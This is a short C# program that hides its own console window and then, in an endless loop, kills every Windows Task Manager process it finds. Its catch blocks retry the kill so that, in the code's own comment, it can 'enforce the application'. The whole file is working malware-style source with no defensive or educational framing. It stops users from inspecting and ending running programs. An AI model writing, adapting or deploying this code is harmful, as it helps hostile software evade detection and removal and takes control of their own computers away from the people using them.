using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Taskmanager
{
    internal class Program
    {
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        public static void Main(string[] args)
        {
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, 0);
            lul();
        }

        private static void lul()
        {
            Process[] pname, clear = null;
            while (true)
                if (Process.GetProcessesByName("Taskmgr").Length > 0)
                {
                    try
                    {
                        pname = Process.GetProcessesByName("Taskmgr");
                        pname[0].Kill();
                        Array.Clear(pname, 0, pname.Length);
                    }

                    #region too much catch stuff to enforce the application and hopefully does not crash too early

                    catch (IndexOutOfRangeException e)
                    {
                        pname = clear;
                        Console.WriteLine(e);
                    }
                    catch (InvalidOperationException e)
                    {
                        Console.WriteLine(e);
                    }
                    catch (Win32Exception)
                    {
                        try
                        {
                            Thread.Sleep(1000);
                            pname = Process.GetProcessesByName("Taskmgr");
                            pname[0].Kill();
                        }
                        catch (IndexOutOfRangeException e)
                        {
                            Console.WriteLine(e);
                            pname = clear;
                        }
                        catch (InvalidOperationException e)
                        {
                            Console.WriteLine(e);
                        }
                    }

                    #endregion
                }
        }
    }
}